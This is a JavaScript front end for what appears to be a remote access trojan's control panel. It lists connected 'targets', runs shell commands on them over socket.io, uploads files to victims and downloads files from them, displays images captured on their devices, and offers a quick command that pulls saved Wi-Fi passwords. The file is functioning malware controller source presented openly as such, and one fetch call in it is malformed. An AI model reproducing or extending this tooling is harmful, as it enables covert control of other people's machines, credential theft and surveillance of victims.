//variables
let target_os = ""
let newUserObj = {}
let logs =""
//socket io
const socket = io();

//userSettings variable
let allowNotification = true;
let allowSound=true;

//initilizations

//automatically add targets
requestTargetList()
//automatically joinn room
joinRoom()

//join room
function joinRoom() {
    const currentTimestamp = new Date().getTime();
    const currentDate = new Date(currentTimestamp);
    socket.emit('joinRoom', {"user":false,"os":"web","time":currentDate,"data":{}});
  }

//topmenu
const settings          = document.getElementById("settings");
//set nickname
const nickNameInput     = document.getElementById("newTargetNicknameInput");
const setNicknameButton = document.getElementById("newTargetSetNicknameButton");
//selector
const targetSelector    = document.getElementById("targetSelector");
const refreshButton     = document.getElementById("refreshButton");
const selectedUserText  = document.getElementById("selectedUserText");
const pingButton        = document.getElementById("pingButton");
const pingSpinnner      = document.getElementById("pingSpinner");
const pingStatusHeading = document.getElementById("pingStatusHeading");
const pingStatusDetail  = document.getElementById("pingStatusDetail");
//quick option selector
const quickOptionselector = document.getElementById("quickOptionSelector");
//output textarea
const output            = document.getElementById("exampleFormControlTextarea1");
//shellinput 
const shellInput        = document.getElementById("shellInput");
//send button
const sendButton        = document.getElementById("sendShellInput");
//clear input
const clearButton       = document.getElementById("clearShellInput");
//clear output
const clearOutputButton = document.getElementById("OutputclearButton");
//notification sound
const notificationSOund = document.getElementById("notificationSound");
//log collapse
const logCollapseBody = document.getElementById("logCollapseBody");
//file upload button
const uploadFileButton = document.getElementById("uploadFileButton");
uploadFileButton.style.display="none";

//image capture IMG
const imageElement = document.getElementById('capturedImage');
const imageDownloadButton = document.getElementById('imageDownloadButton');
const imagefromAddress = document.getElementById("imagefromAddress");

//settings toggle buttons
const toggleButtonNotification = document.getElementById("toggleButtonNotification");
const toggleButtonSound = document.getElementById("toggleButtonSound");
//selector listener
refreshButton.addEventListener("click",()=>{
    requestTargetList();
  })

//request targets list to server
function requestTargetList(){
    socket.emit('getTarget',{});
}
//get targets list from server
socket.on("targets",(targets)=>{
    
    targetSelector.innerHTML=""

    //adding a none option to selector
    const noneOption = document.createElement('option');
    noneOption.textContent = "NONE";
    targetSelector.add(noneOption);

    //adding targets list to selector
    for (const target of targets){
        const option = document.createElement('option');
        option.textContent = target.nickname;
        option.value = target.id;
        targetSelector.add(option);
    }
});

//change target selector value (on selecting a target)
targetSelector.addEventListener('change',()=>{
    selected_target = targetSelector.value;
    selectedUserText.innerHTML = selected_target;
    pingSpinnner.style.display="none";
    if(selected_target !== "NONE"){
        getTargetDetails(selected_target);
    }
});

//request ping 
pingButton.addEventListener('click',()=>{
    if(targetSelector.value !="NONE"){
        pingSpinnner.style.display="block";
        socket.emit("ping",{"target":targetSelector.value})
    }
});

//ping result
socket.on("ping",(data)=>{
    pingSpinnner.style.display="none"
    // Show the modal using jQuery
    $('#pingStatusHeading').text("ALive :)")
    $('#pingStatusDetail').text(`User [${selectedUserText.innerHTML}] ${data.target}  is  Alive`)
    $('#pingStatusModal').modal('show');
});

//new connection modal
socket.on("newcon",(data)=>{
    console.log(data.userObj);
    newUserObj = data.userObj;
    if(allowNotification==true){
    $('#newUserConnectionID').text(data.userObj.id)
    $('#newUserConnectionOS').text(data.userObj.os)
    $('#NewTargetAdmin').text(data.userObj.admin)
    $('#NewTargetime').text(data.userObj.joined)
    if(data.userObj.admin==true){
        newTargetNicknameInput.disabled = true
    }else{newTargetNicknameInput.disabled=false}
    $('#newUserConnection').modal("show")
    date = new Date();
    currentDateAndtime =`${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}` 
    logText = `<span class="logContent">${data.userObj.id} - ${data.userObj.os}[ <span style="color: yellow;">${(data.userObj.admin)?"ADMIN":"TARGET"}</span> ] <span style="color: yellowgreen;">Connected</span> @ ${currentDateAndtime}</span>`
    logs = logs+logText;
    logCollapseBody.innerHTML = logs;
}
    
    requestTargetList()
    if(allowSound==true){
        notificationSOund.play().catch(error => {
           alert(error)
          });
    }
});

//on disconnection of  a client
socket.on("discon",(data)=>{
    requestTargetList()
    date = new Date();
    currentDateAndtime =`${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}` 
    logText = `<span class="logContent">${data.target} <span style="color: #C70039 ;">Disconnected</span> @ ${currentDateAndtime}</span>`
    console.log("a client disconnected")
    logs = logs+logText;
    logCollapseBody.innerHTML = logs;
    
})

//get target details
function getTargetDetails(target){
    console.log('running function')
    socket.emit("targetDetails",{"target":target})
}

//receive target details
socket.on("targetDetail",(data)=>{
    console.log('received something!')
    console.log(data)
    details = data[0];
    detailText =`
    OS          : ${details.os}<br>
    Time        : ${details.joined}<br>
    NICKNAME    : ${details.nickname}<br>
    ADMIN       : ${details.admin}<br>
    `

    
    //set os detail globally (for quick option selector)
    if((details.os).toLowerCase().includes("windows")){
        target_os = "windows"
    }else if((details.os).toLowerCase().includes("android")){
        target_os = "android"
    }else if((details.os).toLowerCase().includes("web")){
        target_os = "web"
    }else{
        target_os = "unknown"
    }
    
    finalDetailText = detailText+details.userdata;
    $('#targetDetails').html(finalDetailText)
    if(target_os === "windows"){
        for(const option of windowsJsonCommands){
            const quickOption = document.createElement("option");
            quickOption.textContent = option.text;
            quickOption.value = option.cmd;
            quickOptionselector.appendChild(quickOption)
        }
    }
    
});

//top menu
settings.addEventListener('click',()=>{
    console.log(newUserObj)
    console.log(windowsJsonCommands)
});

//set nickname
newTargetSetNicknameButton.addEventListener('click',()=>{
    id = newUserObj.id
    nickname = nickNameInput.value
    console.log(`id : ${id} new nickname : ${nickname} nickname is ${nickname===""} nickname is ${nickname===null}`)
    if(nickname!==""){
        socket.emit('changeNickname',{"nickname":nickname,"id":id})
    }
    
});

//change target nickname confirmation msg (closes if success)
socket.on('success',()=>{
    console.log("successfully changed nickname")
    newTargetNicknameInput.value =""
    $("#newUserConnection").modal('hide')
    requestTargetList()
});

//load quickoption json
function getWindownQuickCommands(){
    fetch("windows.json".then(response=>response.json()).then(data=>{
        console.log(data)
    }))
}

//get quick option command
quickOptionselector.addEventListener('change',()=>{
    selectedOption = quickOptionselector.value;
    if(selectedOption!="None"){
        shellInput.value =selectedOption;
    }
    if(selectedOption.includes("upload")){
        uploadFileButton.style.display="";
    }
    else{
        uploadFileButton.style.display="none";
    }
});

//clear input 
clearButton.addEventListener('click',()=>{
    shellInput.value =""
});

//clear output
clearOutputButton.addEventListener('click',()=>{
    output.value=""
})


//send button shellinput
sendButton.addEventListener("click",()=>{
    value = output.value
    // get base64 of the value if upload option is selected
    if(shellInput.value=="upload"){
        const fileInput = document.getElementById('uploadInput');
        const file = fileInput.files[0];
        if (file) {
            const reader = new FileReader();
        
            reader.onload = function(event) {
              const base64Data = event.target.result.split(',')[1]; // Base64 data
              const filename = file.name
              const fileExtension = filename.split('.').pop()
              console.log('Base64 data:', base64Data);
              console.log('extension'+filename)
              console.log("filename"+fileExtension)
              selected_target =  selectedUserText.innerHTML;
              output.value = value +`\n\n(${selected_target}) [YOU] >> ${shellInput.value}`
              socket.emit('runcmd',{"target":selected_target,"cmd":shellInput.value,"filetype":true,"file":base64Data,"filename":filename,"extension":fileExtension})
              shellInput.value = ""
              output.scrollTop = output.scrollHeight;
            };
        
            reader.readAsDataURL(file);
          }
    }else if(shellInput.value !=""){
      selected_target =  selectedUserText.innerHTML;
      output.value = value +`\n\n(${selected_target}) [YOU] >> ${shellInput.value}`
      socket.emit('runcmd',{"target":selected_target,"cmd":shellInput.value,"filetype":false})
    shellInput.value = ""
    output.scrollTop = output.scrollHeight;
    }
    
  });

//reply from target (through server)
socket.on('reply',(data)=>{
    from = data.from
    result = data.result
    value = output.value
    output.value = value +`\n\n(${from}) [REPLY] >> ${result}`
    output.scrollTop = output.scrollHeight;
    
});

//when file from target is sent 
socket.on('file',(result)=>{
    const link = document.createElement('a');
    link.href = `data:application/octet-stream;base64,${result.result}`;
    link.download = result.filename;
    link.click();
})

//when image captures by target is saved in server
socket.on('imagecapture',(result)=>{
    console.log("got image capture....")
    if(result){
        
        const img = new Image();
        img.src = `data:image/jpeg;base64,${result.result}`;
        img.onload = function() {
            
            imageElement.src = img.src;
          };
        imagefromAddress.innerHTML=result.from
        $("#capturedImageVIewModal").modal("show")
    }
})


//settings menu toggle button functions

//toggle notification
toggleButtonNotification.addEventListener('click',()=>{
    console.log('clicked')
    allowNotification=!allowNotification;
    if(allowNotification===true){
        toggleButtonNotification.style.color ="yellowgreen"
        toggleButtonNotification.innerHTML = "toggle_on"
    }else{
        toggleButtonNotification.style.color ="grey"
        toggleButtonNotification.innerHTML = "toggle_off"
    }
});

//toggle sound
toggleButtonSound.addEventListener('click',()=>{
    console.log('clicked')
    allowSound=!allowSound;
    if(allowSound===true){
        toggleButtonSound.style.color ="yellowgreen"
        toggleButtonSound.innerHTML = "toggle_on"
    }else{
        toggleButtonSound.style.color ="grey"
        toggleButtonSound.innerHTML = "toggle_off"
    }
});

//image capture modal functions
//download image button
imageDownloadButton.addEventListener('click',()=>{
    console.log("pressed")
    const link = document.createElement('a');
    link.href = imageElement.src;
    link.download = 'image.jpg';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
})


//get upload file base64

//windows command json
const windowsJsonCommands=[
    {"text":"upload a file","cmd":"upload","desc":"upload a file to target"},
    {"text":"Connected WIFI Passwords","cmd":"wifipass","desc":"passwords of all wifis connected"},
    {"text":"battery percentage","cmd":"battery","desc":"shows available battery (%)"},
    {"text":"Wifi Connected","cmd":"netsh wlan show interfaces","desc":"details of WIFI Connection present"},
    {"text":"exit connection","cmd":"exit","desc":"closes current connection"},
    
]
